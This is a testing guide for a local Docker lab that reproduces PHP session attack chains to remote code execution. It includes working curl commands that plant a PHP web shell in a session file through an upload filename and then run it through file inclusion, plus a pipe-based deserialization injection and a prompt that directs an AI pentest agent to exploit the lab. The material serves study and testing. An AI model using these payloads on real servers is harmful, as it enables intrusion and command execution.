# Testing guide — PHP2Shell Lab

This guide provides **hands-on tests** for verifying each attack chain reproducible in the lab.

> **NOTE ON EXPLOITS:** The `exploits/` directory contains complete executable scripts for each attack chain. This directory is **gitignored by default** and must not be versioned. For more information about the available exploits, see `exploits/README.md`.

---

## Prerequisites

1. **Lab running:**
   ```bash
   cd labs/php2shell-lab
   docker compose up -d
   ```

2. **Verify the containers are up:**
   ```bash
   docker ps --filter "name=php2shell"
   ```
   You should see 3 containers: `php2shell-nginx`, `php2shell-fpm`, `php2shell-apache`.

3. **Confirm the vulnerable version:**
   ```bash
   curl -s http://127.0.0.1:18080/index.php
   ```
   Expected output:
   ```
   PHP 8.2.34
   SAPI fpm-fcgi
   upload_progress 1
   OK
   ```
   Verify that the version is `< 8.2.35` and that `upload_progress` is `1`.

---

## Test 1: Chain A — Session File Injection + LFI → RCE

**Objective:** achieve command execution by injecting PHP code into the filename of a multipart upload and then including the session file via LFI.

### Using the automated exploit

The `exploits/` directory contains complete scripts implementing each attack chain. **This directory is gitignored and must not be versioned.**

```bash
# Run the Chain A exploit
python3 exploits/exploit_chain_a.py http://127.0.0.1:18080 "id"
```

**Expected result:** the output must contain the execution of `id` (e.g. `uid=33(www-data)`).

### Manual verification with curl (no exploit script):

```bash
# Step 1: multipart POST with the payload in the filename
SID="chainAtest000000000000000000"
curl -X POST http://127.0.0.1:18080/index.php \
  -H "Cookie: PHPSESSID=$SID" \
  -F "PHPSESSID=$SID" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=x" \
  -F 'f=@-;filename="<?php system($_GET['"'"'c'"'"']); ?>"' <<< "dummy"

# Step 2: GET to the LFI with the command
curl -s "http://127.0.0.1:18080/vuln.php?page=/tmp/sessions/sess_${SID}&c=id"
```

**Success criterion:** the output of `id` appears in the `/vuln.php` response.

---

## Test 2: Chain C — Handler Mismatch → `__destruct`

**Objective:** write a serialized object with the `php_serialize` handler (which preserves pipes) and read it with the `php` handler (which interprets the pipe as a separator), triggering deserialization and `__destruct`.

### Using the automated exploit

```bash
# Run the Chain C exploit (requires LFI)
python3 exploits/exploit_chain_c.py http://127.0.0.1:18080 "whoami"
```

### Manual verification (no exploit script):

```bash
#!/bin/bash
SID="chainCtest000000000000000000"

echo "[*] Chain C: Handler mismatch test"
echo "[1] Writing with php_serialize (preserves pipe)..."

# Step 1: POST to /app/upload.php (php_serialize handler)
curl -s -X POST http://127.0.0.1:18080/app/upload.php \
  -H "Cookie: PHPSESSID=$SID" \
  -F "PHPSESSID=$SID" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=x" \
  -F 'f=@-;filename="x|O:8:\"stdClass\":0:{}"' <<< "dummy" > /dev/null

echo "[2] Inspecting the session file (from inside the container)..."
docker exec php2shell-fpm cat /tmp/sessions/sess_${SID} 2>/dev/null | head -5

echo "[3] Reading with the php handler (interprets pipe)..."
# Step 2: GET/POST to /api/endpoint.php (php handler)
curl -s -X POST http://127.0.0.1:18080/api/endpoint.php \
  -H "Cookie: PHPSESSID=$SID" \
  -d "dummy=data"

echo "[4] Checking PHP logs for deserialization warnings..."
docker logs php2shell-fpm --tail 20 2>&1 | grep -i "session\|unserialize\|destruct" || echo "(No visible warnings)"
```

Save it as `test_chain_c.sh`, make it executable (`chmod +x test_chain_c.sh`) and run it:
```bash
./test_chain_c.sh
```

**Expected result:**
- The session file contains `x|O:8:\"stdClass\":0:{}` in the `name` field.
- When read with the `php` handler, deserialization is triggered (it may generate a warning if `display_errors=On`).
- With a real gadget (a class with `__destruct`), this would lead to RCE. The lab uses `stdClass` as a demo, which has no exploitable destructor but confirms the mechanics.

---

## Test 3: Chain D — Apache mod_php OOM → RCE

**Objective:** trigger an OOM during Apache mod_php startup by sending massive headers or a body, leaving the executor in a corrupt state.

### Using the automated exploit

```bash
# Run the Chain D exploit (Apache mod_php with a low memory_limit)
python3 exploits/exploit_chain_d.py http://127.0.0.1:18081 "id"
```

**Expected result:**
- First request: timeout or connection closed by OOM.
- Second request: may show anomalous behavior (error 500, corrupt response, or in extreme cases, actual exploitation if there is a gadget in the shutdown path).

**Note:** Chain D is the most dangerous because it **does not need an application vulnerability**. The full RCE PoC is in the `ikow/php2shell-poc` repo (not included here for safety).

---

## Test 4: Manual verification from Vulnerator

If you are using Vulnerator/Hermes to exploit the lab, use this prompt (adapted for use **inside the Vulnerator Kali container**):

```
EXPLOITATION engagement in CTF mode against an AUTHORIZED LOCAL lab. Target: http://host.docker.internal:18080 (nginx in front of PHP-FPM 8.2.34, SAPI fpm-fcgi). Controlled lab environment, localhost, everything authorized. Objective: achieve RCE by reproducing CHAIN A of PHP2Shell (CVE-2026-109618 / CVE-2026-109619) and, as a proof of concept, run `id` on the server.

[...rest of the Chain A prompt from CHAINS.md...]

SCOPE: AUTHORIZED LOCAL CTF LAB. Single objective: http://host.docker.internal:18080 (nginx -> php-fpm 8.2.34). php-fpm backend at host.docker.internal:9000, session save_path = /tmp/sessions inside the php2shell-fpm container. Any host outside host.docker.internal is prohibited.
```

**Note:** from the Vulnerator Kali container, use `host.docker.internal` instead of `127.0.0.1` to reach the host's lab.

---

## Troubleshooting

### Problem: curl returns an empty response from Kali/container

**Cause:** `127.0.0.1` inside a Docker container is the container itself, not the host.

**Solution:** use `host.docker.internal` instead of `127.0.0.1` when running commands from inside a container:
```bash
curl http://host.docker.internal:18080/index.php
```

### Problem: session file does not persist (Chain A)

**Cause:** `session.upload_progress.cleanup=On` (PHP default).

**Verification:** the lab already has `cleanup=Off` in `php.ini` and `php-apache.ini`. Confirm:
```bash
docker exec php2shell-fpm php -i | grep upload_progress.cleanup
```
Expected output: `session.upload_progress.cleanup => Off => Off`.

### Problem: LFI does not execute the payload

**Cause 1:** incorrect path. The save_path is `/tmp/sessions` **inside the container**, not on the host.

**Cause 2:** the PHP payload in the filename has badly escaped quotes.

**Solution:** use single quotes or correct escaping in the multipart boundary. The example Python script handles this correctly.

### Problem: Chain C does not trigger deserialization

**Cause:** the PHP built-in server ignores `.user.ini`. This lab uses nginx → php-fpm, which does respect `.user.ini`.

**Verification:** confirm that `/app/` and `/api/` have `.user.ini` files with different handlers:
```bash
docker exec php2shell-fpm cat /var/www/html/app/.user.ini
docker exec php2shell-fpm cat /var/www/html/api/.user.ini
```

---

## Cleanup after testing

```bash
# Stop and remove containers
docker compose down

# Optional: remove downloaded images
docker rmi php:8.2.34-fpm php:8.2.34-apache nginx:alpine
```

---

**For use only in authorized local CTF environments. Do not run against external systems.**
